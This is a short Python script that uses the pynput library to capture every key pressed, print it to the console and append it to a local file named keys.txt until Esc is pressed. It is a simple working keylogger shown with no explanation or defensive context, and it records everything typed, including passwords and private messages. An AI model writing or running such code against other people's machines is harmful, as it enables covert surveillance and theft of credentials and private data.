import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def keyPressed(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def keyReleased(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("keys.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press=keyPressed, on_release=keyReleased) as listener:
    listener.join()
